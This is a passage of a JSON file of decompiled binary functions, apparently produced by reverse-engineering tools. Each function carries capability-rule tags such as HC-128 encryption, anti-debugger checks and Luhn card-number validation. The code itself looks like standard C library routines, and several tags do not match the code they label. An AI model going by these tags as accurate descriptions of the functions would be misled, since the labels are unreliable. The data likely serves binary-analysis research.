        "decompiled_code": "\nint64_t * fcn.00408200(int64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar2 = arg1;\n    if (7 < arg3) {\n        iVar3 = noname_1 * 0x101010101010101;\n        uVar1 = arg1 & 7;\n        while (uVar1 != 0) {\n            *piVar2 = noname_1;\n            arg3 = arg3 - 1;\n            piVar2 = piVar2 + 1;\n            uVar1 = piVar2 & 7;\n        }\n        uVar1 = arg3 >> 6;\n        if (uVar1 != 0) {\n            if (arg3 < 120000) {\n                do {\n                    *piVar2 = iVar3;\n                    piVar2[1] = iVar3;\n                    piVar2[2] = iVar3;\n                    piVar2[3] = iVar3;\n                    piVar2[4] = iVar3;\n                    piVar2[5] = iVar3;\n                    piVar2[6] = iVar3;\n                    piVar2[7] = iVar3;\n                    piVar2 = piVar2 + 8;\n                    uVar1 = uVar1 - 1;\n                } while (uVar1 != 0);\n            }\n            else {\n                do {\n                    *piVar2 = iVar3;\n                    piVar2[1] = iVar3;\n                    piVar2[2] = iVar3;\n                    piVar2[3] = iVar3;\n                    piVar2[4] = iVar3;\n                    piVar2[5] = iVar3;\n                    piVar2[6] = iVar3;\n                    piVar2[7] = iVar3;\n                    piVar2 = piVar2 + 8;\n                    uVar1 = uVar1 - 1;\n                } while (uVar1 != 0);\n            }\n        }\n        for (uVar1 = (arg3 & 0x3f) >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *piVar2 = iVar3;\n            piVar2 = piVar2 + 1;\n        }\n        arg3 = arg3 & 7;\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        *piVar2 = noname_1;\n        piVar2 = piVar2 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 575
    },
    "00409190": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nulong * fcn.00409190(uint64_t arg1, uint64_t arg2)\n\n{\n    uint *puVar1;\n    ulong *arg1_00;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uchar auStack40 [32];\n    \n    uVar3 = arg1 * arg2;\n    if ((arg1 == 0) || (arg2 == uVar3 / arg1)) {\n        fcn.0040a6b1(auStack40, fcn.0040a6ae, 0x50f2c0);\n        fcn.0040a6ae(0x50f2c0);\n        arg1_00 = fcn.00408928(uVar3);\n        if ((arg1_00 != NULL) && ((arg1_00[-1] & 2) == 0)) {\n            uVar3 = (arg1_00[-1] & 0xfffffffffffffffc) - 8;\n            uVar2 = uVar3 >> 3;\n            if (uVar2 < 10) {\n                *arg1_00 = 0;\n                arg1_00[1] = 0;\n                arg1_00[2] = 0;\n                if (4 < uVar2) {\n                    arg1_00[3] = 0;\n                    arg1_00[4] = 0;\n                    if (6 < uVar2) {\n                        arg1_00[5] = 0;\n                        arg1_00[6] = 0;\n                        if (8 < uVar2) {\n                            arg1_00[7] = 0;\n                            arg1_00[8] = 0;\n                        }\n                    }\n                }\n            }\n            else {\n                fcn.00408200(arg1_00, 0, uVar3);\n            }\n        }\n        fcn.0040a6b1(auStack40, 1);\n    }\n    else {\n        arg1_00 = NULL;\n        puVar1 = fcn.00406f98(arg1, arg2, uVar3 % arg1);\n        *puVar1 = 0xc;\n    }\n    return arg1_00;\n}\n",
        "token_count": 483
    },
    "00409288": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nulong * fcn.00409288(ulong *arg1, uint64_t arg2)\n\n{\n    uint64_t *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    ulong *arg1_00;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uchar auVar11 [16];\n    uchar auStack88 [40];\n    \n    if (arg1 == NULL) {\n        puVar2 = fcn.00408928(arg2);\n        return puVar2;\n    }\n    if (arg2 == 0) {\n        fcn.00409817(arg1);\n        return NULL;\n    }\n    fcn.0040a6b1(auStack88, fcn.0040a6ae, 0x50f2c0);\n    fcn.0040a6ae(0x50f2c0);\n    if (0xffffffffffffffbf < arg2) {\n        puVar3 = fcn.00406f98();\n        *puVar3 = 0xc;\n        return NULL;\n    }\n    uVar8 = 0x20;\n    if (0x1f < arg2 + 0x17) {\n        uVar8 = arg2 + 0x17 & 0xfffffffffffffff0;\n    }\n    uVar7 = arg1[-1];\n    uVar9 = uVar7 & 0xfffffffffffffffc;\n    if ((uVar7 & 2) == 0) {\n        uVar10 = uVar9;\n        if (uVar9 < uVar8) {\n            puVar2 = arg1 + (uVar9 - 0x10);\n            if (puVar2 == *0x5118e0) {\n                uVar10 = uVar9 + (puVar2[1] & 0xfffffffffffffffc);\n                if (uVar8 + 0x20 <= uVar10) {\n                    *0x5118e0 = arg1 + (uVar8 - 0x10);\n                    arg1[-1] = uVar7 & 1 | uVar8;\n                    (*0x5118e0)[1] = uVar10 - uVar8 | 1;\n                    uVar7 = *0x511f50;\n                    goto code_r0x004095c0;\n                }\n            }\n            else if (((*(puVar2 + (puVar2[1] & 0xfffffffffffffffe) + 8) & 1) == 0) &&\n                    (uVar10 = uVar9 + (puVar2[1] & 0xfffffffffffffffc),  uVar8 <= uVar10)) {\n                auVar11 = CONCAT88(puVar2[2], puVar2[3]);\n                if ((*(puVar2[2] + 0x18) != puVar2) || (*(puVar2[3] + 0x10) != puVar2)) {\n                    auVar11 = fcn.004099f8();\n                }\n                iVar6 = SUB168(auVar11 >> 0x40, 0);\n                *(iVar6 + 0x18) = SUB168(auVar11, 0);\n                *(SUB168(auVar11, 0) + 0x10) = iVar6;\n                goto code_r0x0040947a;\n            }\n            arg1_00 = fcn.00408928(uVar8 - 0xf);\n            if (arg1_00 == NULL) goto code_r0x004095b9;\n            if (arg1_00 + -2 != puVar2) {\n                uVar5 = uVar9 - 8 >> 3;\n                if (uVar5 < 10) {\n                    *arg1_00 = *arg1;\n                    arg1_00[1] = arg1[1];\n                    arg1_00[2] = arg1[2];\n                    if (4 < uVar5) {\n                        arg1_00[3] = arg1[3];\n                        arg1_00[4] = arg1[4];\n                        if (6 < uVar5) {\n                            arg1_00[5] = arg1[5];\n                            arg1_00[6] = arg1[6];\n                            if (8 < uVar5) {\n                                arg1_00[7] = arg1[7];\n                                arg1_00[8] = arg1[8];\n                            }\n                        }\n                    }\n                }\n                else {\n                    fcn.00408190(arg1_00, arg1, uVar9 - 8);\n                }\n                fcn.00409817(arg1);\n                arg1 = arg1_00;\n                uVar7 = *0x511f50;\n                goto code_r0x004095c0;\n            }\n            uVar10 = (arg1_00[-1] & 0xfffffffffffffffc) + uVar9;\n        }\ncode_r0x0040947a:\n        uVar7 = uVar10 - uVar8;\n        if (uVar7 < 0x20) {\n            arg1[-1] = arg1[-1] & 1 | uVar10;\n            puVar1 = arg1 + (uVar10 - 8);\n            *puVar1 = *puVar1 | 1;\n            uVar7 = *0x511f50;\n        }\n        else {\n            arg1[-1] = arg1[-1] & 1 | uVar8;\n            *(arg1 + (uVar8 - 8)) = uVar7 | 1;\n            puVar1 = arg1 + uVar7 + (uVar8 - 8);\n            *puVar1 = *puVar1 | 1;\n            fcn.00409817(arg1 + uVar8);\n            uVar7 = *0x511f50;\n        }\n    }\n    else {\n        iVar6 = arg1[-2];\n        uVar10 = (*0x511f24 - 1) + iVar6 + uVar8 + 8 & ~(*0x511f24 - 1);\n        uVar7 = *0x511f50;\n        if (uVar9 == uVar10 - iVar6) goto code_r0x004095c0;\n        iVar4 = fcn.0040ad68(arg1 + (-0x10 - iVar6), uVar9 + iVar6, uVar10, 1);\n        if (iVar4 != -1) {\n            *(iVar4 + iVar6 + 8) = uVar10 - iVar6 | 2;\n            *0x511f30 = (uVar10 - uVar9) + *0x511f30;\n            arg1 = iVar4 + iVar6 + 0x10;\n            if (*0x511f48 < *0x511f30) {\n                *0x511f48 = *0x511f30;\n            }\n            uVar7 = *0x511f30 + *0x511f38;\n            if (*0x511f30 + *0x511f38 <= *0x511f50) {\n                uVar7 = *0x511f50;\n            }\n            goto code_r0x004095c0;\n        }\n        uVar7 = *0x511f50;\n        if (uVar8 + 8 <= uVar9) goto code_r0x004095c0;\n        puVar2 = fcn.00408928(uVar8 - 0xf);\n        if (puVar2 != NULL) {\n            fcn.00408190(puVar2, arg1, uVar9 - 0x10);\n            fcn.00409817(arg1);\n            arg1 = puVar2;\n            uVar7 = *0x511f50;\n            goto code_r0x004095c0;\n        }\ncode_r0x004095b9:\n        arg1 = NULL;\n        uVar7 = *0x511f50;\n    }\ncode_r0x004095c0:\n    *0x511f50 = uVar7;\n    fcn.0040a6b1(auStack88, 1);\n    return arg1;\n}\n",
        "token_count": 1818
    },
    "0040967d": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.0040967d(uint64_t *arg1)\n\n{\n    uint64_t **ppuVar1;\n    uint64_t uVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint64_t *puVar9;\n    uint64_t *puVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t **ppuVar15;\n    uchar auVar16 [16];\n    \n    iVar11 = 1;\n    if (*arg1 == 0) {\n        for (; iVar11 < 0x60; iVar11 = iVar11 + 1) {\n            puVar10 = arg1 + iVar11 * 2 + 0xc;\n            puVar10[3] = puVar10;\n            puVar10[2] = puVar10;\n        }\n        *(arg1 + 0xd5) = *(arg1 + 0xd5) | 1;\n        arg1[0xd1] = 0;\n        *(arg1 + 0x69c) = 0x10000;\n        arg1[0xd2] = 0x40000;\n        arg1[0xd0] = 0x40000;\n        *arg1 = *arg1 & 3 | 0x50;\n        arg1[0xc] = arg1 + 0xe;\n        uVar8 = fcn.0040a4d4(0x1e);\n        *(arg1 + 0x6a4) = uVar8;\n        return;\n    }\n    uVar7 = *arg1;\n    ppuVar15 = arg1 + 1;\n    *arg1 = uVar7 & 0xfffffffd;\n    ppuVar1 = ppuVar15 + ((uVar7 >> 3) - 2);\n    do {\n        puVar10 = *ppuVar15;\n        if (puVar10 != NULL) {\n            *ppuVar15 = NULL;\n            do {\n                puVar3 = puVar10[2];\n                uVar13 = puVar10[1] & 0xfffffffffffffffe;\n                uVar2 = puVar10 + uVar13;\n                uVar4 = *(uVar2 + 8);\n                if ((puVar10[1] & 1) == 0) {\n                    uVar14 = *puVar10;\n                    puVar9 = puVar10 - uVar14;\n                    uVar5 = puVar9[2];\n                    uVar6 = puVar9[3];\n                    puVar10 = *(uVar5 + 0x18);\n                    if ((puVar10 == puVar9) && (*(uVar6 + 0x10) == puVar10)) {\n                        uVar13 = uVar13 + uVar14;\n                        *(uVar5 + 0x18) = uVar6;\n                        *(uVar6 + 0x10) = uVar5;\n                        goto code_r0x0040970c;\n                    }\ncode_r0x00409740:\n                    auVar16 = fcn.004099f8();\ncode_r0x00409745:\n                    iVar12 = SUB168(auVar16 >> 0x40, 0);\n                    uVar13 = uVar13 + uVar14;\n                    *(iVar12 + 0x18) = SUB168(auVar16, 0);\n                    *(SUB168(auVar16, 0) + 0x10) = iVar12;\ncode_r0x00409750:\n                    uVar2 = arg1[0x10];\n                    arg1[0x10] = puVar10;\n                    *(puVar10 + uVar13) = uVar13;\n                    puVar10[1] = uVar13 | 1;\n                    *(uVar2 + 0x18) = puVar10;\n                    puVar10[2] = uVar2;\n                    puVar10[3] = arg1 + 0xe;\n                }\n                else {\ncode_r0x0040970c:\n                    uVar14 = uVar4 & 0xfffffffffffffffc;\n                    if (uVar2 != arg1[0xc]) {\n                        uVar7 = *(uVar2 + 8 + uVar14);\n                        *(uVar2 + 8) = uVar14;\n                        if ((uVar7 & 1) == 0) {\n                            auVar16 = CONCAT88(*(uVar2 + 0x10), *(uVar2 + 0x18));\n                            uVar4 = *(*(uVar2 + 0x10) + 0x18);\n                            if ((uVar4 != uVar2) || (*(*(uVar2 + 0x18) + 0x10) != uVar4)) goto code_r0x00409740;\n                            goto code_r0x00409745;\n                        }\n                        goto code_r0x00409750;\n                    }\n                    puVar10[1] = uVar13 + uVar14 | 1;\n                    arg1[0xc] = puVar10;\n                }\n                puVar10 = puVar3;\n            } while (puVar3 != NULL);\n        }\n        if (ppuVar15 == ppuVar1) {\n            return;\n        }\n        ppuVar15 = ppuVar15 + 1;\n    } while( true );\n}\n",
        "token_count": 1211
    },
    "004088c8": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nint32_t fcn.004088c8(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar2 = 0x5f;\n    uVar1 = arg1 >> 8;\n    if (uVar1 < 0x10000) {\n        uVar5 = uVar1 - 0x100 >> 0x10 & 8;\n        iVar2 = uVar1 << uVar5;\n        uVar3 = iVar2 - 0x1000U >> 0x10 & 4;\n        iVar2 = iVar2 << uVar3;\n        uVar4 = iVar2 - 0x4000U >> 0x10 & 2;\n        uVar1 = iVar2 << uVar4;\n        iVar2 = (uVar1 >> 0xe & ~(uVar1 >> 0xf)) - (uVar5 + uVar3 + uVar4);\n        iVar2 = (arg1 >> (iVar2 + 0x13U & 0x1f) & 3) + 0x54 + iVar2 * 4;\n    }\n    return iVar2;\n}\n",
        "token_count": 279
    },
    "0040b0a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuchar  [16] fcn.0040b0a4(char *arg1, char *arg2, uint16_t *arg3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uchar auVar7 [16];\n    ulong uStack40;\n    \n    pcVar5 = arg2;\n    pcVar4 = arg2;\n    if ((*(arg3 + 1) & 2) == 0) {\n        iVar3 = *(arg3 + 0xc);\n        if (*(arg3 + 2) == -2) {\n            pcVar5 = *(arg3 + 8) - iVar3;\n            if (arg2 <= pcVar5) {\n                pcVar5 = arg2;\n            }\n            fcn.00408190(iVar3, arg1, pcVar5);\n            *(arg3 + 0xc) = *(arg3 + 0xc) + pcVar5;\ncode_r0x0040b19c:\n            return CONCAT88(uStack40, arg2);\n        }\n        if (arg2 <= *(arg3 + 8) - iVar3) {\n            fcn.00408190(iVar3, arg1, arg2);\n            *(arg3 + 0xc) = *(arg3 + 0xc) + arg2;\n            if ((((*(arg3 + 1) & 1) != 0) && (iVar3 = fcn.0040bb1c(arg1, 10, arg2),  iVar3 != 0)) &&\n               (pcVar5 = fcn.004072f8(arg3),  pcVar5 != NULL)) {\n                if (arg2 <= pcVar5) {\n                    pcVar5 = arg2;\n                }\n                iVar3 = fcn.0040ba2c(arg1 + (arg2 - pcVar5), 10, pcVar5);\n                if (iVar3 != 0) {\n                    iVar3 = (arg1 + (arg2 - pcVar5) + pcVar5) - iVar3;\n                    *(arg3 + 0xc) = *(arg3 + 0xc) - iVar3;\n                    arg2 = arg2 + -iVar3;\n                }\n            }\n            goto code_r0x0040b19c;\n        }\n        if ((iVar3 != *(arg3 + 4)) && (iVar3 = fcn.004072f8(arg3),  iVar3 != 0)) {\n            arg2 = NULL;\n            goto code_r0x0040b19c;\n        }\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -iVar3) {\n        auVar7 = fcn.00406c1c(*(arg3 + 2));\n        iVar3 = SUB168(auVar7, 0);\n        if (iVar3 < 0) {\n            pcVar5 = *(arg3 + 4);\n            *arg3 = *arg3 | 8;\n            pcVar2 = *(arg3 + 8) - pcVar5;\n            if (pcVar2 == NULL) goto code_r0x0040b094;\n            pcVar6 = pcVar4;\n            if (pcVar2 <= pcVar4) {\n                pcVar6 = pcVar2;\n            }\n            goto code_r0x0040b06c;\n        }\n        arg1 = arg1 + iVar3;\n        pcVar5 = SUB168(auVar7 >> 0x40, 0);\n    }\n    goto code_r0x0040b097;\ncode_r0x0040b06c:\n    cVar1 = *arg1;\n    *pcVar5 = cVar1;\n    if ((cVar1 == '\\n') && ((*(arg3 + 1) & 1) != 0)) goto code_r0x0040b089;\n    pcVar5 = pcVar5 + 1;\n    pcVar6 = pcVar6 + -1;\n    if (pcVar6 == NULL) goto code_r0x0040b089;\n    arg1 = arg1 + 1;\n    goto code_r0x0040b06c;\ncode_r0x0040b089:\n    *(arg3 + 0xc) = pcVar5;\n    pcVar5 = pcVar5 + -*(arg3 + 4);\n    pcVar4 = pcVar4 + -pcVar5;\ncode_r0x0040b094:\n    arg2 = arg2 + -pcVar4;\ncode_r0x0040b097:\n    return CONCAT88(pcVar5, arg2);\n}\n",
        "token_count": 1026
    },
    "0040b380": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040b411)\n\nint64_t fcn.0040b380(ulong arg1, int32_t *arg2, code *arg3, ulong noname_3, ulong noname_4, ulong arg6)\n\n{\n    uchar auVar1 [16];\n    uint64_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    int64_t *piVar8;\n    bool bVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    char *pcVar14;\n    char *pcVar15;\n    char cVar16;\n    uint8_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    float10 fVar20;\n    float10 fVar21;\n    float10 in_stack_00000008;\n    int64_t iStack312;\n    int64_t iStack304;\n    char *pcStack296;\n    ulong uStack288;\n    int64_t iStack280;\n    char *pcStack272;\n    int64_t iStack264;\n    int64_t iStack256;\n    char *pcStack248;\n    int64_t iStack240;\n    int64_t iStack232;\n    ulong uStack224;\n    int64_t aiStack216 [12];\n    char acStack120 [32];\n    char cStack88;\n    char acStack76 [8];\n    char cStack68;\n    uchar uStack67;\n    \n    uVar6 = *(arg2 + 2);\n    iVar18 = *arg2;\n    iVar19 = arg2[1];\n    cStack88 = 'e';\n    if ((uVar6 | 0x20) == 0x61) {\n        uVar6 = uVar6 + 6;\n    }\n    if (iVar18 < 0) {\n        iVar18 = 6;\n    }\n    if ((arg2[3] & 2U) == 0) {\n        acStack76[4] = ' ';\n        if ((arg2[3] & 1U) == 0) {\n            acStack76[4] = '\\0';\n        }\n    }\n    else {\n        acStack76[4] = '+';\n    }\n    acStack76[5] = 0;\n    pcStack272 = NULL;\n    if (in_stack_00000008 == 0) {\n        uVar5 = 0xffffffff;\n        if (1 / in_stack_00000008 < 0) {\n            acStack76[4] = '-';\n            uVar5 = 0xffffffff;\n        }\n    }\n    else {\n        fVar21 = in_stack_00000008;\n        if (in_stack_00000008 < 0) {\n            fVar21 = -in_stack_00000008;\n            acStack76[4] = '-';\n        }\n        if (fVar21 == *0x40e3c0 * fVar21) {\n            arg2[4] = 0x20;\n            uStack288 = 0x70;\n            iStack280 = 3;\n            if (uVar6 < 'a') {\n                pcStack272 = 0x4;\n            }\n            pcStack272 = pcStack272 + 0x40e3e0;\n            piVar8 = &iStack264;\n            goto code_r0x0040b8fc;\n        }\n        uVar5 = 8;\n        iVar12 = 0xd;\n        iVar10 = 0x1000;\n        in_stack_00000008 = fVar21;\n        while( true ) {\n            iVar12 = iVar12 + -1;\n            if (*0x40e3c4 <= fVar21) {\n                fVar20 = in_stack_00000008 / *(iVar12 * 0x10 + 0x40e400);\n                if (*0x40e3c4 <= fVar20) {\n                    uVar5 = uVar5 + iVar10;\n                    in_stack_00000008 = fVar20;\n                }\n            }\n            else {\n                fVar20 = *(iVar12 * 0x10 + 0x40e400) * in_stack_00000008;\n                if (fVar20 < *0x40e3c8) {\n                    uVar5 = uVar5 - iVar10;\n                    in_stack_00000008 = fVar20;\n                }\n            }\n            if (iVar12 == 0) break;\n            iVar10 = iVar10 >> 1;\n        }\n        if (*0x40e3c8 <= in_stack_00000008) {\n            in_stack_00000008 = in_stack_00000008 / *0x40e3cc;\n            uVar5 = uVar5 + 1;\n        }\n    }\n    pcVar14 = acStack120 + 2;\n    iVar12 = 0;\n    do {\n        if (*0x40e3d0 <= in_stack_00000008) {\n            uVar2 = ROUND(in_stack_00000008 - *0x40e3d0) ^ 0x8000000000000000;\n        }\n        else {\n            uVar2 = ROUND(in_stack_00000008);\n        }\n        fVar21 = uVar2;\n        if (uVar2 < 0) {\n            fVar21 = fVar21 + *0x40e3d4;\n        }\n        pcVar14 = pcVar14 + 9;\n        iVar10 = 0;\n        in_stack_00000008 = (in_stack_00000008 - fVar21) * *0x40e3c8;\n        do {\n            auVar1 = ZEXT816(uVar2);\n            uVar2 = uVar2 / 10;\n            iVar10 = iVar10 + 1;\n            pcVar14[-iVar10] = SUB161(auVar1 % ZEXT816(10), 0) + '0';\n        } while (iVar10 < 9);\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 3);\n    if (uVar6 < 'a') {\n        cStack88 = 'E';\n        uVar6 = uVar6 + 0x20;\n    }\n    uVar7 = iVar18 + -1 + (uVar6 != 0x67 || iVar18 < 1);\n    uVar13 = uVar7;\n    if ((uVar6 == 0x66) && (uVar13 = uVar7 + uVar5,  uVar7 + uVar5 < -1)) {\n        fcn.00408200(acStack120, 0x30, 0x15);\n        uVar5 = 0xffffffff;\n        uVar13 = uVar5;\n    }\n    acStack120[0] = '\\0';\n    acStack120[1] = 0x30;\n    if (uVar13 < 0x15) {\n        pcVar14 = acStack120 + uVar13 + 3;\n        bVar9 = '4' < acStack120[uVar13 + 3];\n    }\n    else {\n        pcVar14 = acStack120 + 0x17;\n        bVar9 = false;\n    }\n    do {\n        pcVar14 = pcVar14 + -1;\n        *pcVar14 = *pcVar14 + bVar9;\n    } while (*pcVar14 == '0' || '9' < *pcVar14);\n    pcVar15 = acStack120 + 1;\n    pcVar11 = acStack120 + 2;\n    if (pcVar14 <= pcVar15) {\n        uVar5 = uVar5 + 1;\n        pcVar14 = pcVar15;\n        pcVar11 = pcVar15;\n    }\n    pcVar14[1] = '\\0';\n    if (uVar6 == 0x67) {\n        uVar17 = 0x67;\n        if (uVar13 < uVar5 || uVar5 < -4) goto code_r0x0040b70b;\n        uVar7 = uVar13 - uVar5;\n        uVar17 = 0x66;\ncode_r0x0040b70f:\n        uVar13 = uVar5;\n        if (uVar5 < 0) {\n            pcVar11 = pcVar11 + -1;\n            *pcVar11 = '0';\n        }\n    }\n    else {\n        uVar17 = uVar6;\n        if (uVar6 == 0x66) goto code_r0x0040b70f;\ncode_r0x0040b70b:\n        uVar13 = 0;\n    }\n    pcVar15 = pcVar11 + 1;\n    uStack288 = 0xb0;\n    iStack280 = 1;\n    pcStack272 = &cStack68;\n    iVar18 = (pcVar14 + 1) - pcVar15;\n    uStack67 = 0;\n    piVar8 = &iStack264;\n    cStack68 = *pcVar11;\n    if (-1 < uVar13) {\n        iStack264 = 0x70;\n        pcStack248 = pcVar15;\n        if (uVar13 < iVar18) {\n            if (uVar13 < 1) {\n                piVar8 = &iStack264;\n            }\n            else {\n                piVar8 = &iStack240;\n                iVar18 = iVar18 - uVar13;\n                iStack256 = uVar13;\n                pcVar15 = pcVar15 + uVar13;\n            }\n            uVar13 = 0xffffffff;\n        }\n        else {\n            iStack256 = iVar18;\n            if (uVar13 - iVar18 < 1) {\n                piVar8 = &iStack240;\n            }\n            else {\n                piVar8 = aiStack216;\n                iStack240 = 0xb0;\n                iStack232 = uVar13 - iVar18;\n                uStack224 = 0x40e3e3;\n            }\n            uVar13 = 0xffffffff;\n            iVar18 = 0;\n        }\n    }\n    if (((arg2[3] >> 4 & 1 | iVar18 != 0) != 0) || (0 < uVar7 && uVar6 != 0x67)) {\n        *piVar8 = 0x70;\n        piVar8[1] = 1;\n        piVar8[2] = 0x40e3f0;\n        piVar8 = piVar8 + 3;\n    }\n    iVar12 = uVar13 + 1;\n    if (iVar12 != 0) {\n        *piVar8 = 0xb0;\n        piVar8[2] = 0x40e3e3;\n        piVar8[1] = -iVar12;\n        piVar8 = piVar8 + 3;\n    }\n    if (iVar18 != 0) {\n        *piVar8 = 0x70;\n        piVar8[2] = pcVar15;\n        piVar8[1] = iVar18;\n        piVar8 = piVar8 + 3;\n    }\n    if (((uVar6 != 0x67) || ((*(arg2 + 3) & 0x10) != 0)) && (iVar18 - iVar12 < uVar7)) {\n        *piVar8 = 0xb0;\n        piVar8[2] = 0x40e3e3;\n        piVar8[1] = uVar7 - (iVar18 - iVar12);\n        piVar8 = piVar8 + 3;\n    }\n    if (uVar17 != 0x66) {\n        cVar16 = '+';\n        if (uVar5 < 0) {\n            uVar5 = -uVar5;\n            cVar16 = '-';\n        }\n        uVar2 = uVar5;\n        acStack76[3] = 0;\n        iVar18 = 2;\n        pcVar14 = acStack76 + 3;\n        do {\n            do {\n                pcVar15 = pcVar14;\n                iVar18 = iVar18 + 1;\n                iVar12 = uVar2;\n                pcVar14 = pcVar15 + -1;\n                uVar2 = iVar12 / 10 & 0xffffffff;\n                *pcVar14 = iVar12 % 10 + '0';\n            } while (iVar18 < 4);\n        } while (uVar2 != 0);\n        pcVar15[-2] = cVar16;\n        pcVar15[-3] = cStack88;\n        *piVar8 = 0x70;\n        piVar8[1] = iVar18;\n        piVar8[2] = pcVar15 + -3;\n        piVar8 = piVar8 + 3;\n    }\ncode_r0x0040b8fc:\n    piVar3 = &iStack280;\n    do {\n        iVar19 = iVar19 - *piVar3;\n        piVar3 = piVar3 + 3;\n    } while (piVar3 < piVar8);\n    iStack312 = 0xa0;\n    uVar5 = acStack76[4] != '\\0';\n    iVar19 = iVar19 - uVar5;\n    iStack304 = uVar5;\n    pcStack296 = acStack76 + 4;\n    if (0 < iVar19) {\n        if ((*(arg2 + 3) & 8) == 0) {\n            if (arg2[4] == 0x30) {\n                iStack280 = iStack280 + iVar19;\n            }\n            else {\n                iStack304 = uVar5 + iVar19;\n            }\n        }\n        else {\n            *piVar8 = 0xa0;\n            piVar8[1] = iVar19;\n            piVar8[2] = 0x40e3e3;\n            piVar8 = piVar8 + 3;\n        }\n    }\n    piVar3 = &iStack312;\n    iVar18 = 0;\n    do {\n        iVar4 = (*arg3)(arg1, *piVar3, piVar3[1], piVar3[2]);\n        if (iVar4 != piVar3[1]) {\n            return -1;\n        }\n        piVar3 = piVar3 + 3;\n        iVar18 = iVar18 + iVar4;\n    } while (piVar3 < piVar8);\n    return iVar18;\n}\n",
        "token_count": 3184
    },
    "0040b2c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nchar * fcn.0040b2c4(char *arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    char *pcVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    \n    uVar9 = arg3;\n    if ((arg3 < 0) && (uVar9 = -arg3,  arg2 < 0)) {\n        arg2 = -arg2;\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    *arg1 = '\\0';\n    iVar11 = 0xffffffff / uVar9;\n    iVar10 = 0xffffffff % uVar9 + 1;\n    if (iVar10 == uVar9) {\n        iVar11 = iVar11 + 1;\n        iVar10 = 0;\n    }\n    uVar5 = arg2 >> 0x20;\n    uVar7 = arg2 & 0xffffffff;\n    do {\n        pcVar6 = arg1;\n        if (uVar5 == 0) {\n            uVar8 = uVar7 / uVar9;\n            uVar4 = uVar7 % uVar9;\n        }\n        else {\n            iVar12 = uVar5 % uVar9;\n            uVar1 = uVar7 % uVar9 + iVar10 * iVar12;\n            uVar8 = uVar7 / uVar9 + iVar12 * iVar11 + uVar1 / uVar9;\n            uVar4 = uVar1 % uVar9;\n            uVar5 = uVar5 / uVar9;\n        }\n        arg1 = pcVar6 + -1;\n        cVar3 = uVar4 + '0';\n        if (9 < uVar4) {\n            cVar3 = uVar4 + arg4;\n        }\n        *arg1 = cVar3;\n        uVar7 = uVar8;\n    } while ((uVar8 | uVar5) != 0);\n    if (bVar2) {\n        arg1 = pcVar6 + -2;\n        *arg1 = '-';\n    }\n    return arg1;\n}\n",
        "token_count": 528
    },
    "0040864c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
